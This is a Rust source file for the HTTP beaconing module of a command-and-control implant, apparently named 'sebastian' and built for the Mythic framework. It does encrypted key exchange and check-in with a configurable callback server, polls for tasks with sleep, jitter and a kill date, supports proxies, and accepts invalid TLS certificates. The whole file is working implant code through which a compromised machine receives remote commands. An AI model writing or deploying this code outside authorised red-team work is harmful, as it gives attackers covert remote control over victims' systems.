use crate::profiles;
use crate::structs::{
    CheckInMessageResponse, EkeKeyExchangeMessage, EkeKeyExchangeMessageResponse, MythicMessage,
    Profile,
};
use crate::tasks;
use crate::utils;
use crate::utils::crypto;
use base64::{engine::general_purpose::STANDARD as BASE64, Engine};
use chrono::NaiveDate;
use reqwest::header::{HeaderMap, HeaderName, HeaderValue};
use std::collections::HashMap;
use std::str::FromStr;
use std::sync::atomic::{AtomicBool, AtomicI32, Ordering};
use std::sync::RwLock;
use tokio::sync::mpsc;
use tokio::time::Duration;

const MAX_RETRY_COUNT: i32 = 5;

#[derive(Debug, Clone, serde::Deserialize)]
pub struct HttpInitialConfig {
    #[serde(rename = "callback_host")]
    pub callback_host: String,
    #[serde(rename = "callback_port")]
    pub callback_port: i32,
    #[serde(rename = "post_uri")]
    pub post_uri: String,
    #[serde(rename = "get_uri", default)]
    pub get_uri: String,
    #[serde(rename = "query_path_name", default)]
    pub query_path_name: String,
    #[serde(rename = "encrypted_exchange_check")]
    pub encrypted_exchange_check: bool,
    #[serde(rename = "AESPSK")]
    pub aes_psk: String,
    #[serde(rename = "callback_interval")]
    pub interval: i32,
    #[serde(rename = "callback_jitter")]
    pub jitter: i32,
    #[serde(rename = "killdate")]
    pub killdate: String,
    #[serde(default)]
    pub headers: HashMap<String, String>,
    #[serde(rename = "proxy_host", default)]
    pub proxy_host: String,
    #[serde(rename = "proxy_port", default)]
    pub proxy_port: i32,
    #[serde(rename = "proxy_user", default)]
    pub proxy_user: String,
    #[serde(rename = "proxy_pass", default)]
    pub proxy_pass: String,
}

pub struct HttpProfile {
    callback_host: RwLock<String>,
    callback_port: AtomicI32,
    post_uri: RwLock<String>,
    get_uri: RwLock<String>,
    query_path_name: RwLock<String>,
    encrypted_exchange_check: RwLock<bool>,
    aes_key: RwLock<Option<Vec<u8>>>,
    uuid: RwLock<String>,
    interval: AtomicI32,
    jitter: AtomicI32,
    killdate: RwLock<NaiveDate>,
    headers: RwLock<HashMap<String, String>>,
    proxy_host: RwLock<String>,
    proxy_port: AtomicI32,
    proxy_user: RwLock<String>,
    proxy_pass: RwLock<String>,
    running: AtomicBool,
    should_stop: AtomicBool,
}

impl HttpProfile {
    pub fn new(config: HttpInitialConfig) -> Self {
        let aes_key = if !config.aes_psk.is_empty() {
            BASE64.decode(&config.aes_psk).ok()
        } else {
            None
        };

        let killdate = NaiveDate::parse_from_str(&config.killdate, "%Y-%m-%d")
            .unwrap_or_else(|_| NaiveDate::from_ymd_opt(2099, 12, 31).unwrap());

        Self {
            callback_host: RwLock::new(config.callback_host),
            callback_port: AtomicI32::new(config.callback_port),
            post_uri: RwLock::new(config.post_uri),
            get_uri: RwLock::new(config.get_uri),
            query_path_name: RwLock::new(config.query_path_name),
            encrypted_exchange_check: RwLock::new(config.encrypted_exchange_check),
            aes_key: RwLock::new(aes_key),
            uuid: RwLock::new(profiles::get_uuid()),
            interval: AtomicI32::new(config.interval),
            jitter: AtomicI32::new(config.jitter),
            killdate: RwLock::new(killdate),
            headers: RwLock::new(config.headers),
            proxy_host: RwLock::new(config.proxy_host),
            proxy_port: AtomicI32::new(config.proxy_port),
            proxy_user: RwLock::new(config.proxy_user),
            proxy_pass: RwLock::new(config.proxy_pass),
            running: AtomicBool::new(false),
            should_stop: AtomicBool::new(false),
        }
    }

    fn get_base_url(&self) -> String {
        let host = self.callback_host.read().unwrap();
        let port = self.callback_port.load(Ordering::Relaxed);
        // Match Poseidon's parseURLAndPort: omit default ports, ensure trailing slash
        let url = if (port == 443 && host.starts_with("https://"))
            || (port == 80 && host.starts_with("http://"))
        {
            host.to_string()
        } else {
            format!("{}:{}", host, port)
        };
        if url.ends_with('/') { url } else { format!("{}/", url) }
    }

    fn get_post_url(&self) -> String {
        let base = self.get_base_url();
        let uri = self.post_uri.read().unwrap();
        format!("{}{}", base, uri)
    }

    fn build_client(&self) -> reqwest::Client {
        let mut builder = reqwest::Client::builder()
            .danger_accept_invalid_certs(true)
            .no_proxy()
            .timeout(Duration::from_secs(30));

        let proxy_host = self.proxy_host.read().unwrap();
        if !proxy_host.is_empty() {
            let proxy_port = self.proxy_port.load(Ordering::Relaxed);
            let proxy_url = format!("{}:{}", proxy_host, proxy_port);
            if let Ok(proxy) = reqwest::Proxy::all(&proxy_url) {
                let proxy_user = self.proxy_user.read().unwrap();
                let proxy_pass = self.proxy_pass.read().unwrap();
                let proxy = if !proxy_user.is_empty() {
                    proxy.basic_auth(&proxy_user, &proxy_pass)
                } else {
                    proxy
                };
                builder = builder.proxy(proxy);
            }
        }

        builder.build().unwrap_or_else(|_| reqwest::Client::new())
    }

    fn build_headers(&self) -> HeaderMap {
        let mut header_map = HeaderMap::new();
        let headers = self.headers.read().unwrap();
        for (key, value) in headers.iter() {
            if let (Ok(name), Ok(val)) = (
                HeaderName::from_str(key),
                HeaderValue::from_str(value),
            ) {
                header_map.insert(name, val);
            }
        }
        header_map
    }

    /// Encrypt and encode a message with UUID prefix
    /// Format: base64( UUID_bytes + [AES_encrypt(data) | data] )
    fn encode_message(&self, data: &[u8]) -> String {
        let uuid = self.uuid.read().unwrap().clone();
        let aes_key = self.aes_key.read().unwrap();

        let encrypted = if let Some(key) = aes_key.as_ref() {
            crypto::aes_encrypt(key, data)
        } else {
            data.to_vec()
        };

        // UUID is prepended BEFORE base64 encoding (matches Poseidon)
        let mut send_data = uuid.into_bytes();
        send_data.extend_from_slice(&encrypted);
        BASE64.encode(&send_data)
    }

    /// Decode a response: base64 decode, strip UUID, decrypt if needed
    /// Format: base64( UUID_bytes + [AES_encrypt(data) | data] )
    fn decode_response(&self, response_text: &str) -> Option<Vec<u8>> {
        // Base64 decode the entire response first
        let raw = match BASE64.decode(response_text.trim()) {
            Ok(d) => d,
            Err(e) => {
                utils::print_debug(&format!("Base64 decode error: {}", e));
                return None;
            }
        };

        // Must be at least 36 bytes (UUID)
        if raw.len() < 36 {
            return None;
        }

        // Extract UUID (first 36 bytes) and message data
        let new_uuid = String::from_utf8_lossy(&raw[..36]).to_string();
        let message_data = &raw[36..];

        // Update UUID if changed
        {
            let current_uuid = self.uuid.read().unwrap().clone();
            if new_uuid != current_uuid {
                let mut uuid = self.uuid.write().unwrap();
                *uuid = new_uuid;
            }
        }

        let aes_key = self.aes_key.read().unwrap();
        if let Some(key) = aes_key.as_ref() {
            let decrypted = crypto::aes_decrypt(key, message_data);
            if decrypted.is_empty() {
                None
            } else {
                Some(decrypted)
            }
        } else {
            Some(message_data.to_vec())
        }
    }

    /// Send a message to Mythic and return the response
    async fn send_message(&self, data: &[u8]) -> Option<Vec<u8>> {
        let client = self.build_client();
        let url = self.get_post_url();
        let headers = self.build_headers();
        let encoded = self.encode_message(data);

        eprintln!("[sebastian] HTTP POST -> {}", url);

        for attempt in 0..MAX_RETRY_COUNT {
            match client
                .post(&url)
                .headers(headers.clone())
                .body(encoded.clone())
                .send()
                .await
            {
                Ok(resp) => {
                    eprintln!("[sebastian] HTTP response status: {}", resp.status());
                    match resp.text().await {
                    Ok(text) => {
                        if let Some(decoded) = self.decode_response(&text) {
                            return Some(decoded);
                        }
                        eprintln!("[sebastian] Failed to decode response");
                        return None;
                    }
                    Err(e) => {
                        eprintln!("[sebastian] Response read error (attempt {}): {}", attempt, e);
                    }
                }},
                Err(e) => {
                    eprintln!("[sebastian] HTTP send error (attempt {}): {}", attempt, e);
                    profiles::increment_failed_connection("http");
                }
            }

            if attempt < MAX_RETRY_COUNT - 1 {
                tokio::time::sleep(Duration::from_secs(
                    self.get_sleep_time().max(1) as u64,
                ))
                .await;
            }
        }

        None
    }

    /// Perform EKE key exchange
    async fn negotiate_key(&self) -> bool {
        let exchange_check = *self.encrypted_exchange_check.read().unwrap();
        if !exchange_check {
            return true; // No exchange needed
        }

        let (pub_pem, priv_key) = match crypto::generate_rsa_keypair() {
            Some(pair) => pair,
            None => return false,
        };

        let session_id = utils::generate_session_id();

        let eke_msg = EkeKeyExchangeMessage {
            action: "staging_rsa".to_string(),
            pub_key: BASE64.encode(&pub_pem),
            session_id: session_id.clone(),
        };

        let eke_json = match serde_json::to_vec(&eke_msg) {
            Ok(j) => j,
            Err(_) => return false,
        };

        let response_bytes = match self.send_message(&eke_json).await {
            Some(r) => r,
            None => return false,
        };

        let eke_response: EkeKeyExchangeMessageResponse =
            match serde_json::from_slice(&response_bytes) {
                Ok(r) => r,
                Err(_) => return false,
            };

        // Decrypt the session key using our RSA private key
        if let Some(session_key_b64) = &eke_response.session_key {
            let encrypted_session_key = match BASE64.decode(session_key_b64) {
                Ok(d) => d,
                Err(_) => return false,
            };

            let decrypted_key = crypto::rsa_decrypt_cipher_bytes(&encrypted_session_key, &priv_key);
            if decrypted_key.is_empty() {
                return false;
            }

            // Set the new AES key
            let mut aes_key = self.aes_key.write().unwrap();
            *aes_key = Some(decrypted_key);
        }

        // Update UUID if server assigned a new one
        if let Some(new_uuid) = &eke_response.uuid {
            let mut uuid = self.uuid.write().unwrap();
            *uuid = new_uuid.clone();
        }

        true
    }

    /// Perform initial checkin with Mythic
    async fn checkin(&self) -> Option<CheckInMessageResponse> {
        let checkin_msg = profiles::create_checkin_message();
        let checkin_json = serde_json::to_vec(&checkin_msg).ok()?;
        let response_bytes = self.send_message(&checkin_json).await?;
        serde_json::from_slice(&response_bytes).ok()
    }

    /// Check if kill date has passed
    fn past_killdate(&self) -> bool {
        let killdate = self.killdate.read().unwrap();
        let today = chrono::Local::now().date_naive();
        today > *killdate
    }
}

#[async_trait::async_trait]
impl Profile for HttpProfile {
    fn profile_name(&self) -> &str {
        "http"
    }

    fn is_p2p(&self) -> bool {
        false
    }

    async fn start(&self) {
        self.running.store(true, Ordering::Relaxed);
        self.should_stop.store(false, Ordering::Relaxed);

        eprintln!("[sebastian] HTTP profile start(), exchange_check={}", *self.encrypted_exchange_check.read().unwrap());

        // Negotiate key if needed
        if !self.negotiate_key().await {
            eprintln!("[sebastian] HTTP: Key negotiation FAILED");
            self.running.store(false, Ordering::Relaxed);
            return;
        }
        eprintln!("[sebastian] HTTP: Key negotiation OK");

        // Checkin
        let checkin_response = match self.checkin().await {
            Some(r) => r,
            None => {
                eprintln!("[sebastian] HTTP: Checkin FAILED (no response)");
                self.running.store(false, Ordering::Relaxed);
                return;
            }
        };

        if let Some(status) = &checkin_response.status {
            if status != "success" {
                log::error!("HTTP: Checkin status: {}", status);
                self.running.store(false, Ordering::Relaxed);
                return;
            }
        }

        // Update Mythic ID and sync encryption keys
        if let Some(id) = &checkin_response.id {
            profiles::set_mythic_id(id);
            let key_b64 = {
                let aes_key = self.aes_key.read().unwrap();
                aes_key.as_ref().map(|k| BASE64.encode(k))
            };
            if let Some(key) = key_b64 {
                profiles::set_all_encryption_keys(&key);
            }
        }

        utils::print_debug("HTTP: Checkin successful, starting main loop");

        // Main polling loop
        while !self.should_stop.load(Ordering::Relaxed) && !self.past_killdate() {
            // Sleep
            let sleep_time = self.get_sleep_time();
            if sleep_time > 0 {
                tokio::time::sleep(Duration::from_secs(sleep_time as u64)).await;
            }

            if self.should_stop.load(Ordering::Relaxed) {
                break;
            }

            // Build get_tasking message
            let msg = crate::structs::MythicMessage::new_get_tasking();
            let msg_json = match serde_json::to_vec(&msg) {
                Ok(j) => j,
                Err(_) => continue,
            };

            // Send and process response
            if let Some(response_bytes) = self.send_message(&msg_json).await {
                if let Ok(mythic_response) =
                    serde_json::from_slice::<crate::structs::MythicMessageResponse>(&response_bytes)
                {
                    tasks::handle_message_from_mythic(mythic_response).await;
                }
            }
        }

        self.running.store(false, Ordering::Relaxed);
        utils::print_debug("HTTP: Profile stopped");
    }

    fn stop(&self) {
        self.should_stop.store(true, Ordering::Relaxed);
    }

    fn set_sleep_interval(&self, interval: i32) -> String {
        self.interval.store(interval, Ordering::Relaxed);
        format!("Updated interval to {}\n", interval)
    }

    fn get_sleep_interval(&self) -> i32 {
        self.interval.load(Ordering::Relaxed)
    }

    fn set_sleep_jitter(&self, jitter: i32) -> String {
        let j = jitter.clamp(0, 100);
        self.jitter.store(j, Ordering::Relaxed);
        format!("Updated jitter to {}%\n", j)
    }

    fn get_sleep_jitter(&self) -> i32 {
        self.jitter.load(Ordering::Relaxed)
    }

    fn get_sleep_time(&self) -> i32 {
        let interval = self.interval.load(Ordering::Relaxed);
        let jitter = self.jitter.load(Ordering::Relaxed);
        if jitter == 0 || interval == 0 {
            return interval;
        }
        let jitter_range = (interval as f64 * jitter as f64 / 100.0) as i32;
        let variation = utils::random_num_in_range(-jitter_range, jitter_range + 1);
        (interval + variation).max(0)
    }

    async fn sleep(&self) {
        let sleep_time = self.get_sleep_time();
        if sleep_time > 0 {
            tokio::time::sleep(Duration::from_secs(sleep_time as u64)).await;
        }
    }

    fn get_kill_date(&self) -> NaiveDate {
        *self.killdate.read().unwrap()
    }

    fn set_encryption_key(&self, new_key: &str) {
        if let Ok(key) = BASE64.decode(new_key) {
            let mut aes_key = self.aes_key.write().unwrap();
            *aes_key = Some(key);
        }
    }

    fn get_config(&self) -> String {
        let host = self.callback_host.read().unwrap();
        let port = self.callback_port.load(Ordering::Relaxed);
        let post = self.post_uri.read().unwrap();
        let interval = self.interval.load(Ordering::Relaxed);
        let jitter = self.jitter.load(Ordering::Relaxed);
        let killdate = self.killdate.read().unwrap();
        format!(
            "  Host: {}:{}\n  POST URI: {}\n  Interval: {}s\n  Jitter: {}%\n  Kill Date: {}\n",
            host, port, post, interval, jitter, killdate
        )
    }

    fn update_config(&self, parameter: &str, value: &str) {
        match parameter {
            "callback_host" => {
                let mut host = self.callback_host.write().unwrap();
                *host = value.to_string();
            }
            "callback_port" => {
                if let Ok(port) = value.parse::<i32>() {
                    self.callback_port.store(port, Ordering::Relaxed);
                }
            }
            "callback_interval" => {
                if let Ok(interval) = value.parse::<i32>() {
                    self.interval.store(interval, Ordering::Relaxed);
                }
            }
            "callback_jitter" => {
                if let Ok(jitter) = value.parse::<i32>() {
                    self.jitter.store(jitter, Ordering::Relaxed);
                }
            }
            _ => utils::print_debug(&format!("Unknown HTTP config parameter: {}", parameter)),
        }
    }

    fn get_push_channel(&self) -> Option<mpsc::Sender<MythicMessage>> {
        None // HTTP is poll-based, no push channel
    }

    fn is_running(&self) -> bool {
        self.running.load(Ordering::Relaxed)
    }
}
